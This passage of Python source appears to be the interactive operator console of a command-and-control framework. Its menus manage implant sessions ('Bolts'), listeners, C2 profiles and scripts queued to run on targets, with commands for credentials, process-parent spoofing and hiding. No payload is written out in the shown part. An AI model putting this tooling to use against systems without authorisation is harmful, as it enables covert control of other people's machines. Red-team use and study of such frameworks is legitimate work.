            window msg 0 "Hello There!" "Hello World!"
            window sw all hide
            window size 7836A -1 -1 100 500
            window mv 7483FE 10 10 -1 -1
            window pos 84A23 200 200 500 750
        """
        if not nes(a):
            return print("window <action> [handle|all|*|0] [args...]")
        self._exec(
            self.shell.cirrus.task_window,
            action=a,
            handle=handle,
            arg1=arg1,
            arg2=arg2,
            arg3=arg3,
            arg4=arg4,
        )


class _MenuBolts(object):
    __slots__ = ("shell", "quick_back")

    _MENU = [
        "all",
        "back",
        "delete",
        "help",
        "info",
        "job",
        "jobs",
        "listeners",
        "ls",
        "lsa",
        "main",
        "profiles",
        "prune",
        "scripts",
        "shutdown",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, n):
        try:
            self.shell.cirrus.show_sessions(exp=Exp.parse(n))
        except ValueError as err:
            print(f"[!] {err}")

    def do_lsa(self, n):
        try:
            self.shell.cirrus.show_sessions(advanced=True, exp=Exp.parse(n))
        except ValueError as err:
            print(f"[!] {err}")

    def do_all(self, n):
        try:
            self.shell.set_menu(MENU_BOLT_ALL, n)
        except ValueError as err:
            print(f"[!] {err}")
            self.shell.set_menu(MENU_BOLTS)

    def do_info(self, n):
        try:
            if len(n) == 0:
                return self.shell.cirrus.show_info(all=True)
            if ":" in n:
                return self.shell.cirrus.show_info(all=True, exp=Exp.parse(n))
            self.shell.cirrus.show_info(n)
        except ValueError as err:
            print(f"[!] {err}!")

    def default(self, n):
        if not _valid_name(n, 7, False):
            return
        try:
            self.shell.cirrus.session(n)
        except ValueError:
            return print(f'[!] Bolt "{n}" does not exist!')
        self.shell.set_menu(MENU_BOLT, n.upper())

    def do_jobs(self, id):
        try:
            if _valid_name(id, 7):
                return self.shell.cirrus.show_jobs(id, all=False)
            if len(id) > 0:
                return
            return self.shell.cirrus.show_jobs(all=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_prune(self, d):
        if len(d) == 0:
            return print("prune <duration>")
        try:
            if not self.shell.cirrus.session_prune(d):
                return
        except ValueError as err:
            return print(f"[!] {err}")
        self.shell.cache._bolts = None

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <id>|all")
        try:
            if n == "all":
                if not do_ask("Confirm delete of ALL Bolts"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.sessions():
                    self.shell.cirrus.session_remove(e["id"], False)
                print("[+] Deleted all Bolts.")
            else:
                self.shell.cirrus.session_remove(n, False)
                print(f"[+] Deleted Bolt {n}.")
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._bolts = None

    def do_scripts(self, _):
        self.shell.set_menu(MENU_SCRIPTS)

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_shutdown(self, n):
        if len(n) == 0:
            return print("shutdown <id>|all")
        try:
            if n == "all":
                if not do_ask("Confirm shutdown of ALL Bolts"):
                    return print("[-] Aborting shutdown!")
                for e in self.shell.cirrus.sessions():
                    self.shell.cirrus.session_remove(e["id"], True)
                print("[+] Triggered shutdown on all Bolts.")
            else:
                self.shell.cirrus.session_remove(n, True)
                print(f"[+] Triggered shutdown on Bolts {n}.")
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._bolts = None

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def do_job(self, id, job):
        if not _valid_name(id, 7):
            return print("job <id> [job]")
        try:
            if _valid_name(job):
                if self.shell.cirrus.show_result(id, int(job)):
                    return
                return print(f"[+] Job {job} returned no content.")
            return self.shell.cirrus.show_jobs(id, all=False)
        except ValueError:
            if not _valid_name(job):
                return print(f'[!] Bolt "{id}" does not exist!')
            print(f'[!] Job "{id}:{job}" does not exist!')

    def prompt(self, args=None):
        return " > Bolts > "

    def completenames(self, n, *_):
        return _menu(n, _MenuBolts._MENU + self.shell.cache.bolts(n), True)

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def complete_shutdown(self, n, *_):
        return _complete_with_all(self.shell.cache.bolts(n), n)

    def complete_job(self, n, c, x, *_):
        if len(c) == 0:
            return _EMPTY
        if c.count(" ") == 1:
            return self.shell.cache.bolts(n)
        if c.count(" ") == 2:
            if len(c) < 5 or x <= 4:
                return _EMPTY
            return self.shell.cache.jobs(c[4 : x - 1], n)
        return _EMPTY


class _MenuScripts(object):
    __slots__ = ("shell", "quick_back")

    _MENU = [
        "back",
        "bolts",
        "copy",
        "delete",
        "export",
        "help",
        "history",
        "import",
        "info",
        "listeners",
        "ls",
        "main",
        "new",
        "profiles",
        "rename",
        "return_output",
        "rollback",
        "stop_on_error",
        "update",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, _):
        try:
            self.shell.cirrus.show_scripts()
        except ValueError as err:
            print(f"[!] {err}")

    def do_new(self, n):
        try:
            self.shell.cirrus.script_add(n)
        except ValueError:
            return print(f'[!] Script "{n}" does not exist!')
        self.shell.cache._scripts = None
        print(f"[+] Script {n} created.")

    def do_info(self, n):
        if len(n) == 0:
            return print("info <script>|all")
        try:
            if n != "all":
                return self.shell.cirrus.show_script_info(n)
            for i in self.shell.cirrus.scripts().keys():
                self.shell.cirrus.show_script_info(i)
                print()
        except ValueError as err:
            print(f"[!] {err}")

    def default(self, n):
        if not _valid_name(n, 1, True):
            return
        try:
            self.shell.cirrus.script(n)
        except ValueError:
            return print(f'[!] Script "{n}" does not exist!')
        self.shell.set_menu(MENU_SCRIPT, n.lower())

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <name>|all")
        if n == "all" and not do_ask("Confirm delete of ALL Scripts"):
            return print("[-] Aborting delete!")
        try:
            if n == "all":
                for e in self.shell.cirrus.scripts().keys():
                    self.shell.cirrus.script_remove(e)
                print("[+] Deleted all Scripts.")
            else:
                self.shell.cirrus.script_remove(n)
                print(f'[+] Deleted Script "{n}".')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._scripts = None

    def do_history(self, n):
        if len(n) == 0:
            return print("history <script>")
        try:
            self.shell.cirrus.show_script_history(n)
        except ValueError as err:
            print(f"[!] {err}")

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_copy(self, n, new):
        if not nes(n) or not nes(new):
            return print("copy <script> <new_name>")
        try:
            self.shell.cirrus.script_duplicate(n, new)
        except ValueError as err:
            return print(f"[!] {err}")
        self.shell.cache._scripts = None
        print(f'[+] Copied Script "{n}" to "{new}".')

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def prompt(self, args=None):
        return " > Scripts > "

    def do_rename(self, n, new):
        if not nes(n) or not nes(new):
            return print("rename <script> <new_name>")
        try:
            self.shell.cirrus.script_rename(n, new)
        except ValueError as err:
            return print(f"[!] {err}")
        self.shell.cache._scripts = None
        print(f'[+] Renamed Script "{n}" to "{new}".')

    def do_import(self, n, file):
        if not nes(n) or not nes(file):
            return print("import <script> <file>")
        try:
            self.shell.cirrus.script_import(n, file)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}")
        self.shell.cache._scripts = None
        print(f'[+] Imported Script "{n}" from "{file}".')

    def do_update(self, n, file):
        if not nes(n) or not nes(file):
            return print("update <script> <file>")
        try:
            self.shell.cirrus.script_replace(n, file)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}")
        print(f'[+] Updated Script "{n}" from "{file}".')

    def do_export(self, n, file):
        if not nes(n):
            return print("export <script> [file]")
        try:
            self.shell.cirrus.script_export(n, file)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}")
        if not nes(file):
            return
        print(f'[+] Exported Script "{n}" to "{file}".')

    def do_rollback(self, n, pos):
        p = None
        if nes(n):
            try:
                p = int(pos)
            except ValueError:
                return print("rollback <script> [number]")
        try:
            r = self.shell.cirrus.script_rollback(n, p)
        except ValueError as err:
            return print(f"[!] {err}!")
        del p
        print(f'[+] Rolled Script "{n}" to "{r["rollbacks"]}".')
        del r

    def completenames(self, n, *_):
        return _menu(n, _MenuScripts._MENU + self.shell.cache.scripts(n))

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.scripts(n), n)

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.scripts(n), n)

    def complete_update(self, n, *_):
        return self.shell.cache.scripts(n)

    def do_return_output(self, n, v):
        self._get_set_setting(n, "Return Output", "return_output", "output", v)

    def do_stop_on_error(self, n, v):
        self._get_set_setting(n, "Stop on Error", "stop_on_error", "stop_on_error", v)

    def complete_copy(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)

    def complete_history(self, n, *_):
        return self.shell.cache.scripts(n)

    def complete_export(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)

    def complete_rename(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)

    def complete_rollback(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)

    def _get_set_setting(self, i, n, a, p, v):
        if not nes(v):
            try:
                r = self.shell.cirrus.script(i)
                if r is None or a not in r:
                    print(f"{i}: {n} == False")
                else:
                    print(f"{i}: {n} == {str(r[a]).title()}")
                del r
            except ValueError as err:
                print(f"[!] {err}!")
            return
        b = is_true(v)
        try:
            self.shell.cirrus.script_update(i, **{p: b})
        except ValueError as err:
            return print(f"[!] {err}!")
        print(f'[+] Updated Script "{i}" set "{n}" to "{str(b).title()}"')
        del n

    def complete_return_output(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)

    def complete_stop_on_error(self, n, c, *_):
        if c.count(" ") > 1:
            return _EMPTY
        return self.shell.cache.scripts(n)


class _MenuProfile(object):
    __slots__ = ("name", "shell", "quick_back")

    _MENU = [
        "back",
        "base64",
        "bin",
        "delete",
        "edit",
        "exit",
        "export",
        "help",
        "info",
        "json",
        "main",
        "replace",
        "update",
    ]

    def __init__(self, shell):
        self.name = None
        self.shell = shell
        self.quick_back = True

    def do_bin(self, _):
        try:
            self.shell.cirrus.show_profile(self.name, as_bytes=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_back(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_json(self, _):
        try:
            print(
                dumps(
                    self.shell.cirrus.profile(self.name).json(),
                    sort_keys=False,
                    indent=4,
                )
            )
        except ValueError as err:
            print(f"[!] {err}!")

    def do_info(self, _):
        try:
            self.shell.cirrus.show_profile(self.name)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_edit(self, _):
        # TODO(dij): Work on
        print("Come back later...")

    def do_delete(self, _):
        try:
            self.shell.cirrus.profile_remove(self.name)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None
        print(f'[+] Deleted Profile "{self.name}".')
        self.shell.set_menu(MENU_PROFILES)

    def do_base64(self, _):
        try:
            print(b64encode(self.shell.cirrus.profile(self.name)).decode("UTF-8"))
        except ValueError as err:
            print(f"[!] {err}!")

    def do_update(self, d):
        if len(d) == 0:
            return print("update <file|base64|json>")
        try:
            self.shell.cirrus.profile_build_update(self.name, d)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}!")
        print(f'[+] Updated Profile "{self.name}".')

    def do_replace(self, d):
        self.do_update(d)

    def do_export(self, file):
        try:
            p = self.shell.cirrus.profile(self.name)
            if not nes(file):
                return print(b64encode(p).decode("UTF-8"))
            with open(expanduser(expandvars(file)), "wb") as f:
                f.write(p)
            print(f'[+] Exported Profile "{self.name}" to "{file}".')
            del p
        except (ValueError, OSError) as err:
            print(f"[!] {err}!")

    def prompt(self, args=None):
        self.name = args
        return f" > Profiles > {args} > "

    def completenames(self, n, *_):
        return _menu(n, _MenuProfile._MENU)


class _MenuProfiles(object):
    __slots__ = ("shell", "quick_back")

    _MENU = [
        "back",
        "base64",
        "bin",
        "bolts",
        "delete",
        "edit",
        "exit",
        "export",
        "help",
        "import",
        "info",
        "json",
        "listeners",
        "ls",
        "main",
        "new",
        "replace",
        "scripts",
        "update",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, _):
        try:
            self.shell.cirrus.show_profiles()
        except ValueError as err:
            print(f"[!] {err}!")

    def do_bin(self, n):
        if len(n) == 0:
            return print("bin <name>")
        try:
            self.shell.cirrus.show_profile(n, as_bytes=True)
        except ValueError as err:
            print(f"[!] {err}!")

    def do_new(self, n):
        # if len(n) == 0:
        #    return print("new <name>")
        # TODO(dij): Work on
        #            Could probally pipe the args into this from cfg-builder?
        print("Come back later...")
        # self.shell.cache._profiles = None

    def default(self, n):
        if not _valid_name(n, 1, True):
            return
        try:
            self.shell.cirrus.profile(n)
        except ValueError:
            return print(f'[!] Profile "{n}" does not exist!')
        self.shell.set_menu(MENU_PROFILE, n.lower())

    def do_edit(self, n):
        # if len(n) == 0:
        #    return print("edit <name>")
        # TODO(dij): Work on
        #            Could probally pipe the args into this from cfg-builder?
        print("Come back later...")

    def do_json(self, n):
        if len(n) == 0:
            return print("json <name|all>")
        try:
            if n != "all":
                return print(
                    dumps(
                        self.shell.cirrus.profile(n).json(),
                        sort_keys=False,
                        indent=4,
                    )
                )
            for k, p in self.shell.cirrus.profiles().items():
                print(f"{k}\n{dumps(p.json(), sort_keys=False)}")
        except ValueError as err:
            print(f"[!] {err}!")

    def do_info(self, n):
        if len(n) == 0:
            return print("info <name|all>")
        try:
            if n != "all":
                return self.shell.cirrus.show_profile(n)
            e = list(self.shell.cirrus.profiles().keys())
            for x in range(0, len(e)):
                if x > 0:
                    print()
                self.shell.cirrus.show_profile(e[x])
            del e
        except ValueError as err:
            print(f"[!] {err}!")

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <name|all>")
        try:
            if n == "all":
                if not do_ask("Confirm deletion of ALL Profiles"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.profiles().keys():
                    self.shell.cirrus.profile_remove(e)
                print("[+] All Profiles deleted!")
            else:
                self.shell.cirrus.profile_remove(n)
                print(f'[+] Deleted Profile "{n}".')
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None

    def do_base64(self, n):
        if len(n) == 0:
            return print("base64 <name|all>")
        try:
            if n != "all":
                return print(b64encode(self.shell.cirrus.profile(n)).decode("UTF-8"))
            for k, p in self.shell.cirrus.profiles().items():
                print(f'{k+":":<21}{b64encode(p).decode("UTF-8")}')
        except ValueError as err:
            print(f"[!] {err}!")

    def do_scipts(self, _):
        self.shell.set_menu(MENU_SCRIPTS)

    def do_listeners(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def prompt(self, args=None):
        return " > Profiles > "

    def do_export(self, n, file):
        if not nes(n):
            return print("export <name> [file]")
        try:
            p = self.shell.cirrus.profile(n)
            if not nes(file):
                return print(b64encode(p).decode("UTF-8"))
            with open(expanduser(expandvars(file)), "wb") as f:
                f.write(p)
            print(f'[+] Exported Profile "{n}" to "{file}".')
            del p
        except (ValueError, OSError) as err:
            print(f"[!] {err}!")

    def do_import(self, n, data):
        if not nes(n) or not nes(data):
            return print("import <name> <file|base64|json>")
        try:
            self.shell.cirrus.profile_build_add(n, data)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}!")
        self.shell.cache._profiles = None
        print(f'[+] Imported Profile "{n}"!')

    def do_update(self, n, data):
        if not nes(n) or not nes(data):
            return print("update <name> <file|base64|json>")
        try:
            self.shell.cirrus.profile_build_update(n, data)
        except (OSError, ValueError) as err:
            return print(f"[!] {err}!")
        print(f'[+] Updated Profile "{n}".')

    def do_replace(self, n, data):
        self.do_update(n, data)

    def complete_bin(self, n, *_):
        return self.shell.cache.profiles(n)

    def completenames(self, n, *_):
        return _menu(n, _MenuProfiles._MENU + self.shell.cache.profiles(n))

    def complete_edit(self, n, *_):
        return self.shell.cache.profiles(n)

    def complete_json(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_base64(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.profiles(n), n)

    def complete_export(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_update(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.profiles(n)
        return _EMPTY


class _MenuListener(object):
    __slots__ = ("name", "shell", "quick_back")

    _MENU = [
        "back",
        "delete",
        "exit",
        "help",
        "info",
        "main",
        "noscript",
        "profile",
        "replace",
        "script",
        "update",
    ]

    def __init__(self, shell):
        self.name = None
        self.shell = shell
        self.quick_back = True

    def do_back(self, _):
        self.shell.set_menu(MENU_LISTENERS)

    def do_info(self, _):
        try:
            _print_listener_info(self.shell.cirrus.listener(self.name))
        except ValueError as err:
            print(f"[!] {err}!")

    def do_script(self, n):
        if len(n) == 0:
            try:
                r = self.shell.cirrus.listener(self.name)
            except ValueError as err:
                return print(f"[!] {err}!")
            if "script" not in r or not nes(r["script"]):
                print("No Connect Script is set.")
            else:
                print(f'Connect Script is {r["script"]}')
            del r
            return
        try:
            if n == "-c":
                self.shell.cirrus.listener_update_script(self.name, "")
                print(f'[+] Cleared Connect Script for "{self.name}".')
            else:
                self.shell.cirrus.listener_update_script(self.name, n)
                print(f'[+] Set Connect Script for "{self.name}" to "{n}".')
        except ValueError as err:
            print(f"[!] {err}!")

    def do_delete(self, _):
        if not do_ask(f'Confirm deletion of Listener "{self.name}"'):
            return print("[-] Aborting delete!")
        try:
            self.shell.cirrus.listener_remove(self.name)
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._listeners = None
        print(f'[+] Deleted Listener "{self.name}".')
        self.shell.set_menu(MENU_LISTENERS)

    def do_profile(self, _):
        try:
            r = self.shell.cirrus.listener(self.name)
            if "profile_name" not in r:
                return print(
                    f'[!] Listener "{self.name}" does not have an associated Profile!'
                )
            self.shell.cirrus.profile(r["profile_name"])
            self.shell.set_menu(MENU_PROFILE, r["profile_name"])
            del r
        except ValueError as err:
            print(f"[!] {err}!")

    def do_noscript(self, _):
        try:
            self.shell.cirrus.listener_update_script(self.name, "")
            print(f'[+] Cleared Connect Script for "{self.name}".')
        except ValueError as err:
            print(f"[!] {err}!")

    def prompt(self, args=None):
        self.name = args
        return f" > Listener > {args} > "

    def completenames(self, n, *_):
        return _menu(n, _MenuListener._MENU)

    def do_update(self, a, profile):
        self._upgrade("update", a, profile)

    def do_replace(self, a, profile):
        self._upgrade("replace", a, profile)

    def complete_script(self, n, *_):
        return self.shell.cache.scripts(n)

    def complete_update(self, n, c, *_):
        return self.complete_replace(n, c, _)

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 2:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def _upgrade(self, name, address, profile):
        if not nes(address):
            return print(f"{name} <address> [profile]")
        try:
            r = self.shell.cirrus.listener_update(self.name, address, profile)
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(r["profile"], validate=True))
        print(f'[+] Listener "{self.name}" @ {r["listener"]["address"]} ({c}) updated!')
        del r, c


class _MenuListeners(object):
    __slots__ = ("shell", "quick_back")

    _MENU = [
        "back",
        "bolts",
        "delete",
        "exit",
        "help",
        "info",
        "ls",
        "main",
        "new",
        "profile",
        "profiles",
        "replace",
        "scripts",
        "update",
    ]

    def __init__(self, shell):
        self.shell = shell
        self.quick_back = True

    def do_ls(self, _):
        try:
            self.shell.cirrus.show_listeners()
        except ValueError as err:
            print(f"[!] {err}!")

    def do_new(self, *a):
        if len(a) == 0:
            return print("new [-s|--script script] <name> <address> <profile>")
        r = _PARSERS[0xD].parse_args(a)
        if not nes(r.name) or not nes(r.address) or not nes(r.profile):
            return print("new [-s|--script script] <name> <address> <profile>")
        try:
            o = self.shell.cirrus.listener_add(r.name, r.address, r.profile, r.script)
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(o["profile"], validate=True))
        print(f'[+] Listener "{r.name}" @ {o["listener"]["address"]} ({c}) created!')
        del r, o, c
        self.shell.cache._listeners = None

    def default(self, n):
        if not _valid_name(n, 1, True):
            return
        try:
            self.shell.cirrus.listener(n)
        except ValueError:
            return print(f'[!] Listener "{n}" does not exist!')
        self.shell.set_menu(MENU_LISTENER, n.lower())

    def do_info(self, n):
        if len(n) == 0:
            return print("info <name|all>")
        try:
            if n != "all":
                return _print_listener_info(self.shell.cirrus.listener(n))
            for v in self.shell.cirrus.listeners().values():
                _print_listener_info(v)
        except ValueError:
            print(f'[!] Listener "{n}" does not exist!')

    def do_bolts(self, _):
        self.shell.set_menu(MENU_BOLTS)

    def do_delete(self, n):
        if len(n) == 0:
            return print("delete <name|all>")
        try:
            if n == "all":
                if not do_ask("Confirm deletion of ALL Listeners"):
                    return print("[-] Aborting delete!")
                for e in self.shell.cirrus.listeners():
                    self.shell.cirrus.listener_remove(e["name"])
                print("[+] All Listeners deleted.")
            else:
                if not do_ask(f'Confirm deletion of Listener "{n}"'):
                    return print("[-] Aborting delete!")
                self.shell.cirrus.listener_remove(n)
                print(f"[+] Deleted Listener {n}.")
        except ValueError as err:
            return print(f"[!] {err}!")
        self.shell.cache._listeners = None

    def do_profile(self, n):
        if len(n) == 0:
            return print("profile <name>")
        try:
            r = self.shell.cirrus.listener(n)
            if "profile_name" not in r:
                return print(f'[!] Listener "{n}" does not have an associated Profile!')
            self.shell.cirrus.profile(r["profile_name"])
            self.shell.set_menu(MENU_PROFILE, r["profile_name"])
            del r
        except ValueError as err:
            print(f"[!] {err}!")

    def do_update(self, *a):
        self._upgrade("update", a)

    def do_scripts(self, _):
        self.shell.set_menu(MENU_SCRIPTS)

    def do_profiles(self, _):
        self.shell.set_menu(MENU_PROFILES)

    def do_replace(self, *a):
        self._upgrade("replace", a)

    def prompt(self, args=None):
        return " > Listeners > "

    def _upgrade(self, name, a):
        if len(a) == 0:
            return print(f"{name} [-s|--script script] <name> <address> [profile]")
        r = _PARSERS[0xD].parse_args(a)
        if not nes(r.name):
            return print(f"{name} [-s|--script script] <name> <address> [profile]")
        if not r.no_script and r.script is None and not nes(r.address):
            return print(f"{name} [-s|--script script] <name> <address> [profile]")
        if r.script is None and r.no_script:
            r.script = ""
        try:
            o = self.shell.cirrus.listener_update(
                r.name, r.address, r.profile, r.script
            )
        except ValueError as err:
            return print(f"[!] {err}!")
        c = Config(b64decode(o["profile"], validate=True))
        print(f'[+] Listener "{r.name}" @ {o["listener"]["address"]} ({c}) updated!')
        del r, o, c

    def completenames(self, n, *_):
        return _menu(n, _MenuListeners._MENU + self.shell.cache.listeners(n))

    def complete_info(self, n, *_):
        return _complete_with_all(self.shell.cache.listeners(n), n)

    def complete_new(self, n, c, *_):
        if len(c) < 3:
            return _EMPTY
        if c[-3:] == "-s " or (len(c) > 9 and c[-9:] == "--script "):
            return self.shell.cache.scripts(n)
        if " -s " in c or " --sc" in c:
            if c.count(" ") == 5:
                return self.shell.cache.profiles(n)
            return _EMPTY
        if c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return _EMPTY

    def complete_delete(self, n, *_):
        return _complete_with_all(self.shell.cache.listeners(n), n)

    def complete_profile(self, n, *_):
        return self.shell.cache.listeners(n)

    def complete_update(self, n, c, *_):
        return self.complete_replace(n, c, _)

    def complete_replace(self, n, c, *_):
        if c.count(" ") == 1:
            return self.shell.cache.listeners(n)
        if len(c) < 3:
            return _EMPTY
        if c[-3:] == "-s " or (len(c) > 9 and c[-9:] == "--script "):
            return self.shell.cache.scripts(n)
        if " -s " in c or " --sc" in c:
            if c.count(" ") == 5:
                return self.shell.cache.profiles(n)
            return _EMPTY
        if c.count(" ") == 3:
            return self.shell.cache.profiles(n)
        return _EMPTY


class _MenuScript(_MenuBolt):
    __slots__ = ("line", "name", "args", "lock", "show_line")

    _MENU = [
        "history",
        "return_output",
        "rollback",
        "stop_on_error",
        "undo",
        "wait",
    ] + _MenuBolt._MENU
    _PROMPT = """This is the interactive scripting interface.

Any commands entered here will ONLY be checked for valid parameters and will be
written to the script "{script}".

These will only be executed ONCE the script is ran on a target (as a connection
script or using the "script" command).

Some operations are not available in scripts and any "output" or "destination"
arguments will be omitted and instead randomally generated.

The "undo", "rollback" and "history" commands can be used to view command history
or undo any entries."""

    def __init__(self, shell):
        _MenuBolt.__init__(self, shell)
        self.line = None
        self.name = None
        self.args = dict()
        self.lock = Lock()
        self.show_line = True
        self._setup()

    def _setup(self):
        d = vars(self.__class__)
        for i in dir(self):
            if not i.startswith("do_"):
                continue
            if i in d:
                self.args[i] = getattr(self, i).__code__.co_argcount - 1
                continue
            try:
                f = getattr(self, i)
            except AttributeError:
                continue
            setattr(self, i, self._wrap_func(f))
        del d

    def default(self, c):
        if self.shell.no_default_run:
            return
        self._do_exec(super(__class__, self).do_run, c, c)

    def do_back(self, _):
        self.shell.set_menu(MENU_SCRIPTS)

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        k = getattr(self.shell.cirrus, "script" + f.__name__[4:])
        if "out" in a:
            del a["out"]
        if k.__name__ == "script_download" and "dest" in a:
            del a["dest"]
        try:
            r = k(self.name, self.line, **a)
        except (ValueError, TypeError) as err:
            return print(f"[!] {err}!")
        del a
        self._set_prompt(r)
        del r

    def _wrap_func(self, f):
        self.args[f.__name__] = f.__code__.co_argcount

        def _func(*a, line=None):
            self._do_exec(f, a, line)

        return _func

    def _set_prompt(self, r):
        if r is None or "rollbacks" not in r:
            self.shell.prompt = f" > Scripts > {self.name}#? > "
            return
        self.shell.prompt = f' > Scripts > {self.name}#{r["rollbacks"]} > '

    def arg_count(self, name):
        if name in self.args:
            return self.args[name]
        return None

    def _add_note(self, line):
        try:
            r = self.shell.cirrus.script_note(self.name, line)
        except ValueError as err:
            return print(f"[!] {err}!")
        self._set_prompt(r)
        del r

    def complete_job(self, *_):
        return _EMPTY

    def prompt(self, args=None):
        self.name = args
        print(_MenuScript._PROMPT.format(script=self.name))
        print("Default execution is ", end="")
        if self.shell.no_default_run:
            print('disabled. Execution can only occur with "run", "shell" or "pwsh".')
        else:
            print("enabled.")
        # NOTE(dij): Not sure if we should catch a ValueError here?
        #            What could we do if it happens? If it does, ugh thats bad.
        r = self.shell.cirrus.script(self.name)
        if r is None or "rollbacks" not in r:
            return f" > Scripts > {self.name}#? > "
        return f' > Scripts > {self.name}#{r["rollbacks"]} > '

    def do_cat(self, f, line=None):
        self._do_exec(super(__class__, self).do_download, [f, None], line)

    def _do_exec(self, f, a, line):
        self.lock.acquire(True)
        self.line = line
        try:
            if isinstance(a, str):
                return f(a)
            if a is None:
                return f(None)
            if len(a) == 1 and f.__code__.co_argcount <= 2:
                return f(a[0])
            return f(*a)
        finally:
            self.line = None
            self.lock.release()

    def completenames(self, n, *_):
        return _menu(n, _MenuScript._MENU)

    def do_job(self, _, line=None):
        print("Not available inside a Script.")

    def do_wait(self, d, line=None):
        """
        wait <duration>

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Wait will indicate the script to pause for the time period given. This
        allows for adding a "pause" in any scripts.

        The default duration is parsed as seconds, however the "s", "m" or "h"
        suffixes may be specified to suggest seconds, minutes and hours respectively.

        Examples:
            wait 10
            wait 1m
        """
        if not nes(d):
            return print("wait <duration>")
        self._do_exec(super(__class__, self)._system, [f"wait {d}"], line)

    def do_info(self, _, line=None):
        try:
            self.shell.cirrus.show_script_info(self.name)
        except ValueError as err:
            print(f"[!] {err}")

    def do_help(self, n, line=None):
        if len(n) == 0 or n == "help":
            return print("help <command>")
        try:
            d = getattr(self, "do_" + n).__doc__
        except AttributeError:
            return print(f'[!] Help text for "{n}" not found.')
        if d is None:
            try:
                d = getattr(super(__class__, self), "do_" + n).__doc__
            except AttributeError:
                pass
        if d is None:
            return print(f'[!] Help text for "{n}" not found.')
        for i in d.strip().split("\n"):
            print(i.lstrip(whitespace))
        del d

    def do_undo(self, n, line=None):
        """
        undo [steps to undo]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        Undo is used to undo commands entered in the scripting interface. If
        nothing is specific as an argument, undo will undo the last command entered.
        Otherwise undo will attempt to rollback to the specified index.

        Undo is an alias of "rollback".

        Examples:
            undo
            undo 2
            undo 0 # Rollback to the start
        """
        self.do_rollback(n, line)

    def do_jobs(self, _, line=None):
        print("Not available inside a Script.")

    def do_last(self, _, line=None):
        print("Not available inside a Script.")

    def do_script(self, _, line=None):
        print("Cannot call a Script from inside a Script.")

    def do_creds(self, *a, line=None):
        if not super(__class__, self).do_creds(*a):
            return
        self._add_note(line)

    def do_history(self, _, line=None):
        """
        history

        History will output the list of commands entered to this script and will
        list the index of each command.
        """
        try:
            r = self.shell.cirrus.script(self.name)
        except ValueError as err:
            return print(f"[!] {err}!")
        if r is None or "commands" not in r:
            return
        v = r["commands"]
        for x in range(0, len(v)):
            print(f"{x:3}: {v[x]}")
        del v, r

    def do_parent(self, *a, line=None):
        if not super(__class__, self).do_parent(*a):
            return
        self._add_note(line)

    def do_set_hide(self, v, line=None):
        if not super(__class__, self).do_set_hide(v):
            return
        self._add_note(line)

    def do_rollback(self, n, line=None):
        """
        rollback [steps to rollback]

        OS:    Any
        OPsec: n/a
        Admin: n/a

        rollback is used to undo commands entered in the scripting interface. If
        nothing is specific as an argument, undo will undo the last command entered.
        Otherwise undo will attempt to rollback to the specified index.

        Examples:
            rollback
            rollback 2
